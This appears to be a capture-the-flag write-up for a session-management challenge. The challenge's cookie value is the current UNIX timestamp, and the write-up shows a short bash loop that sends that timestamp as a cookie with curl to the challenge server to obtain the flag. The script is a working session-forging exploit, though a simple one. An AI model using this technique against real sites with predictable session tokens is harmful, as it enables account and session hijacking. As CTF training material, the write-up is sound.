# SPIROS (Session Management)

## Challenge: 

![challenge description-basic](img/session/chall%20desc.png)


## Solution (Timing Attack):
This challenge requires us to generate the current UNIX timestamp, supplying it in the cookie value `Chase=$timestamp`.

With the following script, we are able to obtain the current UNIX timestamp and send it to the webserver as a cookie.

```
#!/bin/bash

while true; do
    timestamp=$(date +%s)
    curl --cookie Chase=$timestamp https://www.spiros.ml/session-id/chase.php
done
```
Running the above script, we were able to obtain the flag! :')

![challenge description-basic](img/session/got%20flag.png)